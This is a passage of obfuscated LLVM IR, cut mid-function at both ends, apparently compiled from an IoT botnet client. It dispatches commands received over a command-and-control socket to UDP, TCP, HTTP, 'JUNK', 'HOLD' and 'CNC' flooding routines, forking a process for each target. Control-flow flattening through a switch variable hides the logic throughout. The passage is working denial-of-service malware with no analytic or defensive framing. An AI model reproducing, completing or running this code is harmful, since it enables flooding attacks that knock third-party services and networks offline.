  %241 = call i32 @listFork()
  %242 = icmp ne i32 %241, 0
  %243 = select i1 %242, i32 2115519659, i32 -430964991
  store i32 %243, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %245 = load i8*, i8** %14, align 8
  %246 = load i32, i32* %12, align 4
  %247 = load i32, i32* %13, align 4
  call void @sendJUNK(i8* %245, i32 %246, i32 %247)
  %248 = load i32, i32* @mainCommSock, align 4
  %249 = call i32 @close(i32 %248)
  call void @_exit(i32 0) #12
  unreachable

; <label>:250:                                    ; preds = %loopEntry
  %251 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %251, i8** %14, align 8
  store i32 913436360, i32* %switchVar
  br label %loopEnd

; <label>:252:                                    ; preds = %loopEntry
  store i32 -893515640, i32* %switchVar
  br label %loopEnd

; <label>:253:                                    ; preds = %loopEntry
  %254 = call i32 @listFork()
  %255 = icmp ne i32 %254, 0
  %256 = select i1 %255, i32 -130985062, i32 1897058091
  store i32 %256, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  store i32 196278165, i32* %switchVar
  br label %loopEnd

; <label>:258:                                    ; preds = %loopEntry
  %259 = load i8*, i8** %11, align 8
  %260 = load i32, i32* %12, align 4
  %261 = load i32, i32* %13, align 4
  call void @sendJUNK(i8* %259, i32 %260, i32 %261)
  call void @_exit(i32 0) #12
  unreachable

; <label>:262:                                    ; preds = %loopEntry
  store i32 941857569, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %264 = load i8**, i8*** %4, align 8
  %265 = getelementptr inbounds i8*, i8** %264, i64 0
  %266 = load i8*, i8** %265, align 8
  %267 = call i32 @strcmp(i8* %266, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.101, i32 0, i32 0)) #10
  %268 = icmp ne i32 %267, 0
  %269 = select i1 %268, i32 14273515, i32 369692686
  store i32 %269, i32* %switchVar
  br label %loopEnd

; <label>:270:                                    ; preds = %loopEntry
  %271 = load i32, i32* %3, align 4
  %272 = icmp slt i32 %271, 6
  %273 = select i1 %272, i32 -13413661, i32 -714889944
  store i32 %273, i32* %switchVar
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  %275 = load i8**, i8*** %4, align 8
  %276 = getelementptr inbounds i8*, i8** %275, i64 3
  %277 = load i8*, i8** %276, align 8
  %278 = call i32 @atoi(i8* %277) #10
  %279 = icmp eq i32 %278, -1
  %280 = select i1 %279, i32 -13413661, i32 -1376395269
  store i32 %280, i32* %switchVar
  br label %loopEnd

; <label>:281:                                    ; preds = %loopEntry
  %282 = load i8**, i8*** %4, align 8
  %283 = getelementptr inbounds i8*, i8** %282, i64 2
  %284 = load i8*, i8** %283, align 8
  %285 = call i32 @atoi(i8* %284) #10
  %286 = icmp eq i32 %285, -1
  %287 = select i1 %286, i32 -13413661, i32 1577938838
  store i32 %287, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  %289 = load i8**, i8*** %4, align 8
  %290 = getelementptr inbounds i8*, i8** %289, i64 4
  %291 = load i8*, i8** %290, align 8
  %292 = call i32 @atoi(i8* %291) #10
  %293 = icmp eq i32 %292, -1
  %294 = select i1 %293, i32 -13413661, i32 -99342012
  store i32 %294, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  %296 = load i8**, i8*** %4, align 8
  %297 = getelementptr inbounds i8*, i8** %296, i64 4
  %298 = load i8*, i8** %297, align 8
  %299 = call i32 @atoi(i8* %298) #10
  %300 = icmp sgt i32 %299, 1024
  %301 = select i1 %300, i32 -13413661, i32 787995795
  store i32 %301, i32* %switchVar
  br label %loopEnd

; <label>:302:                                    ; preds = %loopEntry
  %303 = load i32, i32* %3, align 4
  %304 = icmp eq i32 %303, 6
  %305 = select i1 %304, i32 -681525212, i32 1182314484
  store i32 %305, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = load i8**, i8*** %4, align 8
  %308 = getelementptr inbounds i8*, i8** %307, i64 5
  %309 = load i8*, i8** %308, align 8
  %310 = call i32 @atoi(i8* %309) #10
  %311 = icmp slt i32 %310, 1
  %312 = select i1 %311, i32 -13413661, i32 1182314484
  store i32 %312, i32* %switchVar
  br label %loopEnd

; <label>:313:                                    ; preds = %loopEntry
  store i32 196278165, i32* %switchVar
  br label %loopEnd

; <label>:314:                                    ; preds = %loopEntry
  %315 = load i8**, i8*** %4, align 8
  %316 = getelementptr inbounds i8*, i8** %315, i64 1
  %317 = load i8*, i8** %316, align 8
  store i8* %317, i8** %15, align 8
  %318 = load i8**, i8*** %4, align 8
  %319 = getelementptr inbounds i8*, i8** %318, i64 2
  %320 = load i8*, i8** %319, align 8
  %321 = call i32 @atoi(i8* %320) #10
  store i32 %321, i32* %16, align 4
  %322 = load i8**, i8*** %4, align 8
  %323 = getelementptr inbounds i8*, i8** %322, i64 3
  %324 = load i8*, i8** %323, align 8
  %325 = call i32 @atoi(i8* %324) #10
  store i32 %325, i32* %17, align 4
  %326 = load i8**, i8*** %4, align 8
  %327 = getelementptr inbounds i8*, i8** %326, i64 4
  %328 = load i8*, i8** %327, align 8
  %329 = call i32 @atoi(i8* %328) #10
  store i32 %329, i32* %18, align 4
  %330 = load i32, i32* %3, align 4
  %331 = icmp eq i32 %330, 6
  %332 = select i1 %331, i32 2130588136, i32 56576609
  store i32 %332, i32* %switchVar
  br label %loopEnd

; <label>:333:                                    ; preds = %loopEntry
  %334 = load i8**, i8*** %4, align 8
  %335 = getelementptr inbounds i8*, i8** %334, i64 5
  %336 = load i8*, i8** %335, align 8
  %337 = call i32 @atoi(i8* %336) #10
  store i32 212063821, i32* %switchVar
  store i32 %337, i32* %.reg2mem2
  br label %loopEnd

; <label>:338:                                    ; preds = %loopEntry
  store i32 212063821, i32* %switchVar
  store i32 10, i32* %.reg2mem2
  br label %loopEnd

; <label>:339:                                    ; preds = %loopEntry
  %.reload3 = load i32, i32* %.reg2mem2
  store i32 %.reload3, i32* %19, align 4
  store i32 32, i32* %20, align 4
  %340 = load i8*, i8** %15, align 8
  %341 = call i8* @strstr(i8* %340, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #10
  %342 = icmp ne i8* %341, null
  %343 = select i1 %342, i32 -1394308151, i32 -386249470
  store i32 %343, i32* %switchVar
  br label %loopEnd

; <label>:344:                                    ; preds = %loopEntry
  %345 = load i8*, i8** %15, align 8
  %346 = call i8* @strtok(i8* %345, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %346, i8** %21, align 8
  store i32 -1111190080, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  %348 = load i8*, i8** %21, align 8
  %349 = icmp ne i8* %348, null
  %350 = select i1 %349, i32 -1841565672, i32 1504313527
  store i32 %350, i32* %switchVar
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  %352 = call i32 @listFork()
  %353 = icmp ne i32 %352, 0
  %354 = select i1 %353, i32 -1622057979, i32 10012054
  store i32 %354, i32* %switchVar
  br label %loopEnd

; <label>:355:                                    ; preds = %loopEntry
  %356 = load i8*, i8** %21, align 8
  %357 = load i32, i32* %16, align 4
  %358 = load i32, i32* %17, align 4
  %359 = load i32, i32* %18, align 4
  %360 = load i32, i32* %19, align 4
  %361 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %356, i32 %357, i32 %358, i32 %359, i32 %360, i32 %361)
  call void @_exit(i32 0) #12
  unreachable

; <label>:362:                                    ; preds = %loopEntry
  %363 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %363, i8** %21, align 8
  store i32 -1111190080, i32* %switchVar
  br label %loopEnd

; <label>:364:                                    ; preds = %loopEntry
  store i32 -866439040, i32* %switchVar
  br label %loopEnd

; <label>:365:                                    ; preds = %loopEntry
  %366 = call i32 @listFork()
  %367 = icmp ne i32 %366, 0
  %368 = select i1 %367, i32 966926369, i32 -890208537
  store i32 %368, i32* %switchVar
  br label %loopEnd

; <label>:369:                                    ; preds = %loopEntry
  store i32 196278165, i32* %switchVar
  br label %loopEnd

; <label>:370:                                    ; preds = %loopEntry
  %371 = load i8*, i8** %15, align 8
  %372 = load i32, i32* %16, align 4
  %373 = load i32, i32* %17, align 4
  %374 = load i32, i32* %18, align 4
  %375 = load i32, i32* %19, align 4
  %376 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %371, i32 %372, i32 %373, i32 %374, i32 %375, i32 %376)
  call void @_exit(i32 0) #12
  unreachable

; <label>:377:                                    ; preds = %loopEntry
  store i32 14273515, i32* %switchVar
  br label %loopEnd

; <label>:378:                                    ; preds = %loopEntry
  %379 = load i8**, i8*** %4, align 8
  %380 = getelementptr inbounds i8*, i8** %379, i64 0
  %381 = load i8*, i8** %380, align 8
  %382 = call i32 @strcmp(i8* %381, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.102, i32 0, i32 0)) #10
  %383 = icmp ne i32 %382, 0
  %384 = select i1 %383, i32 1693745776, i32 1848052928
  store i32 %384, i32* %switchVar
  br label %loopEnd

; <label>:385:                                    ; preds = %loopEntry
  %386 = load i32, i32* %3, align 4
  %387 = icmp slt i32 %386, 6
  %388 = select i1 %387, i32 -2011345444, i32 2044899162
  store i32 %388, i32* %switchVar
  br label %loopEnd

; <label>:389:                                    ; preds = %loopEntry
  %390 = load i8**, i8*** %4, align 8
  %391 = getelementptr inbounds i8*, i8** %390, i64 3
  %392 = load i8*, i8** %391, align 8
  %393 = call i32 @atoi(i8* %392) #10
  %394 = icmp slt i32 %393, 1
  %395 = select i1 %394, i32 -2011345444, i32 2005647079
  store i32 %395, i32* %switchVar
  br label %loopEnd

; <label>:396:                                    ; preds = %loopEntry
  %397 = load i8**, i8*** %4, align 8
  %398 = getelementptr inbounds i8*, i8** %397, i64 5
  %399 = load i8*, i8** %398, align 8
  %400 = call i32 @atoi(i8* %399) #10
  %401 = icmp slt i32 %400, 1
  %402 = select i1 %401, i32 -2011345444, i32 1909561772
  store i32 %402, i32* %switchVar
  br label %loopEnd

; <label>:403:                                    ; preds = %loopEntry
  store i32 196278165, i32* %switchVar
  br label %loopEnd

; <label>:404:                                    ; preds = %loopEntry
  %405 = call i32 @listFork()
  %406 = icmp ne i32 %405, 0
  %407 = select i1 %406, i32 -489127888, i32 703537616
  store i32 %407, i32* %switchVar
  br label %loopEnd

; <label>:408:                                    ; preds = %loopEntry
  store i32 196278165, i32* %switchVar
  br label %loopEnd

; <label>:409:                                    ; preds = %loopEntry
  %410 = load i8**, i8*** %4, align 8
  %411 = getelementptr inbounds i8*, i8** %410, i64 1
  %412 = load i8*, i8** %411, align 8
  %413 = load i8**, i8*** %4, align 8
  %414 = getelementptr inbounds i8*, i8** %413, i64 2
  %415 = load i8*, i8** %414, align 8
  %416 = load i8**, i8*** %4, align 8
  %417 = getelementptr inbounds i8*, i8** %416, i64 3
  %418 = load i8*, i8** %417, align 8
  %419 = call i32 @atoi(i8* %418) #10
  %420 = trunc i32 %419 to i16
  %421 = load i8**, i8*** %4, align 8
  %422 = getelementptr inbounds i8*, i8** %421, i64 4
  %423 = load i8*, i8** %422, align 8
  %424 = load i8**, i8*** %4, align 8
  %425 = getelementptr inbounds i8*, i8** %424, i64 5
  %426 = load i8*, i8** %425, align 8
  %427 = call i32 @atoi(i8* %426) #10
  %428 = load i8**, i8*** %4, align 8
  %429 = getelementptr inbounds i8*, i8** %428, i64 6
  %430 = load i8*, i8** %429, align 8
  %431 = call i32 @atoi(i8* %430) #10
  call void @sendHTTP(i8* %412, i8* %415, i16 zeroext %420, i8* %423, i32 %427, i32 %431)
  call void @exit(i32 0) #14
  unreachable

; <label>:432:                                    ; preds = %loopEntry
  %433 = load i8**, i8*** %4, align 8
  %434 = getelementptr inbounds i8*, i8** %433, i64 0
  %435 = load i8*, i8** %434, align 8
  %436 = call i32 @strcmp(i8* %435, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.103, i32 0, i32 0)) #10
  %437 = icmp ne i32 %436, 0
  %438 = select i1 %437, i32 -1267775492, i32 -1532355842
  store i32 %438, i32* %switchVar
  br label %loopEnd

; <label>:439:                                    ; preds = %loopEntry
  %440 = load i32, i32* %3, align 4
  %441 = icmp slt i32 %440, 4
  %442 = select i1 %441, i32 -940949035, i32 1003282710
  store i32 %442, i32* %switchVar
  br label %loopEnd

; <label>:443:                                    ; preds = %loopEntry
  %444 = load i8**, i8*** %4, align 8
  %445 = getelementptr inbounds i8*, i8** %444, i64 2
  %446 = load i8*, i8** %445, align 8
  %447 = call i32 @atoi(i8* %446) #10
  %448 = icmp slt i32 %447, 1
  %449 = select i1 %448, i32 -940949035, i32 578538595
  store i32 %449, i32* %switchVar
  br label %loopEnd

; <label>:450:                                    ; preds = %loopEntry
  %451 = load i8**, i8*** %4, align 8
  %452 = getelementptr inbounds i8*, i8** %451, i64 3
  %453 = load i8*, i8** %452, align 8
  %454 = call i32 @atoi(i8* %453) #10
  %455 = icmp slt i32 %454, 1
  %456 = select i1 %455, i32 -940949035, i32 -2020369682
  store i32 %456, i32* %switchVar
  br label %loopEnd

; <label>:457:                                    ; preds = %loopEntry
  store i32 196278165, i32* %switchVar
  br label %loopEnd

; <label>:458:                                    ; preds = %loopEntry
  %459 = load i8**, i8*** %4, align 8
  %460 = getelementptr inbounds i8*, i8** %459, i64 1
  %461 = load i8*, i8** %460, align 8
  store i8* %461, i8** %22, align 8
  %462 = load i8**, i8*** %4, align 8
  %463 = getelementptr inbounds i8*, i8** %462, i64 2
  %464 = load i8*, i8** %463, align 8
  %465 = call i32 @atoi(i8* %464) #10
  store i32 %465, i32* %23, align 4
  %466 = load i8**, i8*** %4, align 8
  %467 = getelementptr inbounds i8*, i8** %466, i64 3
  %468 = load i8*, i8** %467, align 8
  %469 = call i32 @atoi(i8* %468) #10
  store i32 %469, i32* %24, align 4
  %470 = load i8*, i8** %22, align 8
  %471 = call i8* @strstr(i8* %470, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #10
  %472 = icmp ne i8* %471, null
  %473 = select i1 %472, i32 49795550, i32 -1664256017
  store i32 %473, i32* %switchVar
  br label %loopEnd

; <label>:474:                                    ; preds = %loopEntry
  %475 = load i8*, i8** %22, align 8
  %476 = call i8* @strtok(i8* %475, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %476, i8** %25, align 8
  store i32 -131838849, i32* %switchVar
  br label %loopEnd

; <label>:477:                                    ; preds = %loopEntry
  %478 = load i8*, i8** %25, align 8
  %479 = icmp ne i8* %478, null
  %480 = select i1 %479, i32 91182917, i32 656372580
  store i32 %480, i32* %switchVar
  br label %loopEnd

; <label>:481:                                    ; preds = %loopEntry
  %482 = call i32 @listFork()
  %483 = icmp ne i32 %482, 0
  %484 = select i1 %483, i32 885112850, i32 621207311
  store i32 %484, i32* %switchVar
  br label %loopEnd

; <label>:485:                                    ; preds = %loopEntry
  %486 = load i8*, i8** %25, align 8
  %487 = load i32, i32* %23, align 4
  %488 = load i32, i32* %24, align 4
  call void @sendCNC(i8* %486, i32 %487, i32 %488)
  %489 = load i32, i32* @mainCommSock, align 4
  %490 = call i32 @close(i32 %489)
  call void @_exit(i32 0) #12
  unreachable

; <label>:491:                                    ; preds = %loopEntry
  %492 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %492, i8** %25, align 8
  store i32 -131838849, i32* %switchVar
  br label %loopEnd

; <label>:493:                                    ; preds = %loopEntry
  store i32 -344849041, i32* %switchVar
  br label %loopEnd

; <label>:494:                                    ; preds = %loopEntry
  %495 = call i32 @listFork()
  %496 = icmp ne i32 %495, 0
  %497 = select i1 %496, i32 149341453, i32 -115041051
  store i32 %497, i32* %switchVar
  br label %loopEnd

; <label>:498:                                    ; preds = %loopEntry
  store i32 196278165, i32* %switchVar
  br label %loopEnd

; <label>:499:                                    ; preds = %loopEntry
  %500 = load i8*, i8** %22, align 8
  %501 = load i32, i32* %23, align 4
  %502 = load i32, i32* %24, align 4
  call void @sendCNC(i8* %500, i32 %501, i32 %502)
  call void @_exit(i32 0) #12
  unreachable

; <label>:503:                                    ; preds = %loopEntry
  store i32 -1267775492, i32* %switchVar
  br label %loopEnd

; <label>:504:                                    ; preds = %loopEntry
  %505 = load i8**, i8*** %4, align 8
  %506 = getelementptr inbounds i8*, i8** %505, i64 0
  %507 = load i8*, i8** %506, align 8
  %508 = call i32 @strcmp(i8* %507, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.104, i32 0, i32 0)) #10
  %509 = icmp ne i32 %508, 0
  %510 = select i1 %509, i32 306126066, i32 -1427046761
  store i32 %510, i32* %switchVar
  br label %loopEnd

; <label>:511:                                    ; preds = %loopEntry
  %512 = load i32, i32* %3, align 4
  %513 = icmp slt i32 %512, 4
  %514 = select i1 %513, i32 1590091019, i32 -2005832662
  store i32 %514, i32* %switchVar
  br label %loopEnd

; <label>:515:                                    ; preds = %loopEntry
  %516 = load i8**, i8*** %4, align 8
  %517 = getelementptr inbounds i8*, i8** %516, i64 2
  %518 = load i8*, i8** %517, align 8
  %519 = call i32 @atoi(i8* %518) #10
  %520 = icmp slt i32 %519, 1
  %521 = select i1 %520, i32 1590091019, i32 -678478359
  store i32 %521, i32* %switchVar
  br label %loopEnd

; <label>:522:                                    ; preds = %loopEntry
  %523 = load i8**, i8*** %4, align 8
  %524 = getelementptr inbounds i8*, i8** %523, i64 3
  %525 = load i8*, i8** %524, align 8
  %526 = call i32 @atoi(i8* %525) #10
  %527 = icmp slt i32 %526, 1
  %528 = select i1 %527, i32 1590091019, i32 1897191281
  store i32 %528, i32* %switchVar
  br label %loopEnd

; <label>:529:                                    ; preds = %loopEntry
  store i32 196278165, i32* %switchVar
  br label %loopEnd

; <label>:530:                                    ; preds = %loopEntry
  %531 = load i8**, i8*** %4, align 8
  %532 = getelementptr inbounds i8*, i8** %531, i64 1
  %533 = load i8*, i8** %532, align 8
  store i8* %533, i8** %26, align 8
  %534 = load i8**, i8*** %4, align 8
  %535 = getelementptr inbounds i8*, i8** %534, i64 2
  %536 = load i8*, i8** %535, align 8
  %537 = call i32 @atoi(i8* %536) #10
  store i32 %537, i32* %27, align 4
  %538 = load i8**, i8*** %4, align 8
  %539 = getelementptr inbounds i8*, i8** %538, i64 3
  %540 = load i8*, i8** %539, align 8
  %541 = call i32 @atoi(i8* %540) #10
  store i32 %541, i32* %28, align 4
  %542 = load i8*, i8** %26, align 8
  %543 = call i8* @strstr(i8* %542, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #10
  %544 = icmp ne i8* %543, null
  %545 = select i1 %544, i32 1173720011, i32 -696250552
  store i32 %545, i32* %switchVar
  br label %loopEnd

; <label>:546:                                    ; preds = %loopEntry
  %547 = load i8*, i8** %26, align 8
  %548 = call i8* @strtok(i8* %547, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %548, i8** %29, align 8
  store i32 1899889429, i32* %switchVar
  br label %loopEnd

; <label>:549:                                    ; preds = %loopEntry
  %550 = load i8*, i8** %29, align 8
  %551 = icmp ne i8* %550, null
  %552 = select i1 %551, i32 1145461812, i32 844411420
  store i32 %552, i32* %switchVar
  br label %loopEnd

; <label>:553:                                    ; preds = %loopEntry
  %554 = call i32 @listFork()
  %555 = icmp ne i32 %554, 0
  %556 = select i1 %555, i32 -84726063, i32 -1606464619
  store i32 %556, i32* %switchVar
  br label %loopEnd

; <label>:557:                                    ; preds = %loopEntry
  %558 = load i8*, i8** %29, align 8
  %559 = load i32, i32* %27, align 4
  %560 = load i32, i32* %28, align 4
  call void @sendJUNK(i8* %558, i32 %559, i32 %560)
  %561 = load i8*, i8** %29, align 8
  %562 = load i32, i32* %27, align 4
  %563 = load i32, i32* %28, align 4
  call void @sendHOLD(i8* %561, i32 %562, i32 %563)
  %564 = load i32, i32* @mainCommSock, align 4
  %565 = call i32 @close(i32 %564)
  call void @_exit(i32 0) #12
  unreachable

; <label>:566:                                    ; preds = %loopEntry
  %567 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %567, i8** %29, align 8
  store i32 1899889429, i32* %switchVar
  br label %loopEnd

; <label>:568:                                    ; preds = %loopEntry
  store i32 -197856700, i32* %switchVar
  br label %loopEnd

; <label>:569:                                    ; preds = %loopEntry
  %570 = call i32 @listFork()
  %571 = icmp ne i32 %570, 0
  %572 = select i1 %571, i32 -268290687, i32 609316863
  store i32 %572, i32* %switchVar
  br label %loopEnd

; <label>:573:                                    ; preds = %loopEntry
  store i32 196278165, i32* %switchVar
  br label %loopEnd

; <label>:574:                                    ; preds = %loopEntry
  %575 = load i8*, i8** %26, align 8
  %576 = load i32, i32* %27, align 4
  %577 = load i32, i32* %28, align 4
  call void @sendJUNK(i8* %575, i32 %576, i32 %577)
  %578 = load i8*, i8** %26, align 8
  %579 = load i32, i32* %27, align 4
  %580 = load i32, i32* %28, align 4
  call void @sendHOLD(i8* %578, i32 %579, i32 %580)
  call void @_exit(i32 0) #12
  unreachable

; <label>:581:                                    ; preds = %loopEntry
  store i32 306126066, i32* %switchVar
  br label %loopEnd

; <label>:582:                                    ; preds = %loopEntry
  %583 = load i8**, i8*** %4, align 8
  %584 = getelementptr inbounds i8*, i8** %583, i64 0
  %585 = load i8*, i8** %584, align 8
  %586 = call i32 @strcmp(i8* %585, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.105, i32 0, i32 0)) #10
  %587 = icmp ne i32 %586, 0
  %588 = select i1 %587, i32 -174055280, i32 -653314166
  store i32 %588, i32* %switchVar
  br label %loopEnd

; <label>:589:                                    ; preds = %loopEntry
  %590 = load i32, i32* %3, align 4
  %591 = icmp slt i32 %590, 6
  %592 = select i1 %591, i32 -1897181835, i32 -335492300
  store i32 %592, i32* %switchVar
  br label %loopEnd

; <label>:593:                                    ; preds = %loopEntry
  %594 = load i8**, i8*** %4, align 8
  %595 = getelementptr inbounds i8*, i8** %594, i64 3
  %596 = load i8*, i8** %595, align 8
  %597 = call i32 @atoi(i8* %596) #10
  %598 = icmp eq i32 %597, -1
  %599 = select i1 %598, i32 -1897181835, i32 316214779
  store i32 %599, i32* %switchVar
  br label %loopEnd

; <label>:600:                                    ; preds = %loopEntry
  %601 = load i8**, i8*** %4, align 8
  %602 = getelementptr inbounds i8*, i8** %601, i64 2
  %603 = load i8*, i8** %602, align 8
  %604 = call i32 @atoi(i8* %603) #10
  %605 = icmp eq i32 %604, -1
  %606 = select i1 %605, i32 -1897181835, i32 -115788635
  store i32 %606, i32* %switchVar
  br label %loopEnd

; <label>:607:                                    ; preds = %loopEntry
  %608 = load i32, i32* %3, align 4
  %609 = icmp sgt i32 %608, 5
  %610 = select i1 %609, i32 -18434674, i32 491782243
  store i32 %610, i32* %switchVar
  br label %loopEnd

; <label>:611:                                    ; preds = %loopEntry
  %612 = load i8**, i8*** %4, align 8
  %613 = getelementptr inbounds i8*, i8** %612, i64 5
  %614 = load i8*, i8** %613, align 8
  %615 = call i32 @atoi(i8* %614) #10
  %616 = icmp slt i32 %615, 0
  %617 = select i1 %616, i32 -1897181835, i32 491782243
  store i32 %617, i32* %switchVar
  br label %loopEnd

; <label>:618:                                    ; preds = %loopEntry
  %619 = load i32, i32* %3, align 4
  %620 = icmp eq i32 %619, 7
  %621 = select i1 %620, i32 -1409490278, i32 942124837
  store i32 %621, i32* %switchVar
  br label %loopEnd

; <label>:622:                                    ; preds = %loopEntry
  %623 = load i8**, i8*** %4, align 8
  %624 = getelementptr inbounds i8*, i8** %623, i64 6
  %625 = load i8*, i8** %624, align 8
  %626 = call i32 @atoi(i8* %625) #10
  %627 = icmp slt i32 %626, 1
  %628 = select i1 %627, i32 -1897181835, i32 942124837
  store i32 %628, i32* %switchVar
  br label %loopEnd

; <label>:629:                                    ; preds = %loopEntry
  store i32 196278165, i32* %switchVar
  br label %loopEnd

; <label>:630:                                    ; preds = %loopEntry
  %631 = load i8**, i8*** %4, align 8
  %632 = getelementptr inbounds i8*, i8** %631, i64 1
  %633 = load i8*, i8** %632, align 8
  store i8* %633, i8** %30, align 8
  %634 = load i8**, i8*** %4, align 8
  %635 = getelementptr inbounds i8*, i8** %634, i64 2
  %636 = load i8*, i8** %635, align 8
  %637 = call i32 @atoi(i8* %636) #10
  store i32 %637, i32* %31, align 4
  %638 = load i8**, i8*** %4, align 8
  %639 = getelementptr inbounds i8*, i8** %638, i64 3
  %640 = load i8*, i8** %639, align 8
  %641 = call i32 @atoi(i8* %640) #10
  store i32 %641, i32* %32, align 4
  %642 = load i8**, i8*** %4, align 8
  %643 = getelementptr inbounds i8*, i8** %642, i64 4
  %644 = load i8*, i8** %643, align 8
  store i8* %644, i8** %33, align 8
  %645 = load i32, i32* %3, align 4
  %646 = icmp eq i32 %645, 7
  %647 = select i1 %646, i32 1623598919, i32 247826622
  store i32 %647, i32* %switchVar
  br label %loopEnd

; <label>:648:                                    ; preds = %loopEntry
  %649 = load i8**, i8*** %4, align 8
  %650 = getelementptr inbounds i8*, i8** %649, i64 6
  %651 = load i8*, i8** %650, align 8
  %652 = call i32 @atoi(i8* %651) #10
  store i32 -187800883, i32* %switchVar
  store i32 %652, i32* %.reg2mem4
  br label %loopEnd

; <label>:653:                                    ; preds = %loopEntry
  store i32 -187800883, i32* %switchVar
  store i32 10, i32* %.reg2mem4
  br label %loopEnd

; <label>:654:                                    ; preds = %loopEntry
  %.reload5 = load i32, i32* %.reg2mem4
  store i32 %.reload5, i32* %34, align 4
  %655 = load i32, i32* %3, align 4
  %656 = icmp sgt i32 %655, 5
  %657 = select i1 %656, i32 132434357, i32 2094256973
  store i32 %657, i32* %switchVar
  br label %loopEnd

; <label>:658:                                    ; preds = %loopEntry
  %659 = load i8**, i8*** %4, align 8
  %660 = getelementptr inbounds i8*, i8** %659, i64 5
  %661 = load i8*, i8** %660, align 8
  %662 = call i32 @atoi(i8* %661) #10
  store i32 -424260650, i32* %switchVar
  store i32 %662, i32* %.reg2mem6
  br label %loopEnd

; <label>:663:                                    ; preds = %loopEntry
  store i32 -424260650, i32* %switchVar
  store i32 0, i32* %.reg2mem6
  br label %loopEnd

; <label>:664:                                    ; preds = %loopEntry
  %.reload7 = load i32, i32* %.reg2mem6
  store i32 %.reload7, i32* %35, align 4
  store i32 32, i32* %36, align 4
  %665 = load i8*, i8** %30, align 8
  %666 = call i8* @strstr(i8* %665, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #10
  %667 = icmp ne i8* %666, null
  %668 = select i1 %667, i32 -296094000, i32 -2025451113
  store i32 %668, i32* %switchVar
  br label %loopEnd

; <label>:669:                                    ; preds = %loopEntry
  %670 = load i8*, i8** %30, align 8
  %671 = call i8* @strtok(i8* %670, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %671, i8** %37, align 8
  store i32 -333345903, i32* %switchVar
  br label %loopEnd

; <label>:672:                                    ; preds = %loopEntry
  %673 = load i8*, i8** %37, align 8
  %674 = icmp ne i8* %673, null
  %675 = select i1 %674, i32 835682556, i32 -1766226886
  store i32 %675, i32* %switchVar
  br label %loopEnd

; <label>:676:                                    ; preds = %loopEntry
  %677 = call i32 @listFork()
  %678 = icmp ne i32 %677, 0
  %679 = select i1 %678, i32 -1660538233, i32 -1475367385
  store i32 %679, i32* %switchVar
  br label %loopEnd

; <label>:680:                                    ; preds = %loopEntry
  %681 = load i8*, i8** %37, align 8
  %682 = load i32, i32* %31, align 4
  %683 = load i32, i32* %32, align 4
  %684 = load i8*, i8** %33, align 8
  %685 = load i32, i32* %35, align 4
  %686 = load i32, i32* %34, align 4
  %687 = load i32, i32* %36, align 4
  call void @sendTCP(i8* %681, i32 %682, i32 %683, i8* %684, i32 %685, i32 %686, i32 %687)
  call void @_exit(i32 0) #12
  unreachable

; <label>:688:                                    ; preds = %loopEntry
  %689 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %689, i8** %37, align 8
  store i32 -333345903, i32* %switchVar
  br label %loopEnd

; <label>:690:                                    ; preds = %loopEntry
  store i32 1234883779, i32* %switchVar
  br label %loopEnd

; <label>:691:                                    ; preds = %loopEntry
  %692 = call i32 @listFork()
  %693 = icmp ne i32 %692, 0
  %694 = select i1 %693, i32 603983745, i32 1763988205
  store i32 %694, i32* %switchVar
  br label %loopEnd

; <label>:695:                                    ; preds = %loopEntry
  store i32 196278165, i32* %switchVar
  br label %loopEnd

; <label>:696:                                    ; preds = %loopEntry
  %697 = load i8*, i8** %30, align 8
  %698 = load i32, i32* %31, align 4
  %699 = load i32, i32* %32, align 4
  %700 = load i8*, i8** %33, align 8
  %701 = load i32, i32* %35, align 4
  %702 = load i32, i32* %34, align 4
  %703 = load i32, i32* %36, align 4
  call void @sendTCP(i8* %697, i32 %698, i32 %699, i8* %700, i32 %701, i32 %702, i32 %703)
  call void @_exit(i32 0) #12
  unreachable

; <label>:704:                                    ; preds = %loopEntry
  store i32 -174055280, i32* %switchVar
  br label %loopEnd

; <label>:705:                                    ; preds = %loopEntry
  %706 = load i8**, i8*** %4, align 8
  %707 = getelementptr inbounds i8*, i8** %706, i64 0
